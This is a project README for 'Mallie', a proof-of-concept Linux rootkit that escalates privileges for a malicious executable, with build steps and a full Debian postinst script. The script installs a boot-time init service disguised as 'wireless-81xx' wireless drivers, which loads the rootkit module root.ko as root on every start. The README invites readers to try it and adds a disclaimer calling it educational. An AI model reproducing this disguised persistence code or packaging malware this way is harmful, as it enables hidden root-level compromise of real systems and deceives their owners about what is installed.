# Mallie
A Proof-Of-Concept sample linux rootkit that escalates privilleges for a malicious executable, and launches the malicious executable in user space using usermodehelper.

## TODO
- More features for the rootkit, e.g., hide itself from lsmod .etc
- Use to serve functions for another executable

## Build Instructions
This project is still a work-in-progress, but if you'd like to try it out, feel free to do so.

1. Simply clone the project and make it: ```cd mallie && make```
2. Two files will be created: ```root.ko``` and ```mallie (an ELF executable)```

## Resources
- Create deb package: https://www.internalpointers.com/post/build-binary-deb-package-practical-guide
- Make install script in the deb package using DEBIAN/preinstall same as the DEBIAN/control file

## Auto-Start on Boot Script
1) chmod 755 to the postinst script.

2) Once that is done create a symbolic link in the run level directory you would like to use, for example if you wanted to run a program in the graphical runlevel 2, the default runlevel for Ubuntu, you would place it in the /etc/rc2.d directory. You just cannot place it the directory, you must signify when it will run by indicating the startup with an “S” and the execution order is important. Place it after everything else that is in the directory by giving it a higher number. If the last script to be run is rc.local and it is named S99rc.local then you need to add your script as S99myscript. Symbolic link: `ln -s /etc/init.d/myscript /etc/rc3.d/S99myscript`

```bash

#!/bin/bash
# This `DEBIAN/postinst` script is run post-installation

echo '#!/bin/bash' > /etc/init.d/wireless-81xx
echo '
### BEGIN INIT INFO
# Provides:          mallie
# Required-Start:    $local_fs $network
# Required-Stop:     $local_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Wireless service
# Description: Autostart wireless drivers
### END INIT INFO

# Carry out specific functions when asked to by the system
case "$1" in
  start)
    echo "Starting..."
    su - root -c "cd /usr/bin/ && insmod ./root.ko"
    ;;
  stop)
    echo "Stopping..."
    sleep 2
    ;;
  *)
    echo "Usage: /etc/init.d/wireless-81xx {start|stop}"
    exit 1
    ;;
esac

exit 0 ' >> /etc/init.d/wireless-81xx

chmod 755 /etc/init.d/wireless-81xx
cp /usr/local/bin/mallie /usr/bin/
cp /usr/local/bin/root.ko /usr/bin/
ln -s /etc/init.d/wireless-81xx /etc/rc3.d/S01wireless-81xx
sh /etc/init.d/wireless-81xx start

```

/etc/init.d/wireless-81xx
```bash
#! /bin/bash

### BEGIN INIT INFO
# Provides:          mallie
# Required-Start:    $local_fs $network
# Required-Stop:     $local_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Wireless service
# Description: Autostart wireless drivers
### END INIT INFO

# Carry out specific functions when asked to by the system
case "$1" in
  start)
    echo "Starting..."
    su - root -c "cd /usr/bin/ && insmod ./root.ko"
    ;;
  stop)
    echo "Stopping..."
    sleep 2
    ;;
  *)
    echo "Usage: /etc/init.d/wireless-81xx {start|stop}"
    exit 1
    ;;
esac

exit 0

```

## Disclaimer

This is purely for educational purposes. The software is provided "as is" and the authors are not responsible for any damage or mishaps that may occur during its use. Misuse of the provided software and information may result in criminal charges.

## Credits
https://askubuntu.com/questions/290099/how-to-run-a-script-during-boot-as-root <br>
https://gist.github.com/drmalex07/298ab26c06ecf401f66c <br>
https://github.com/xcellerator/linux_kernel_hacking
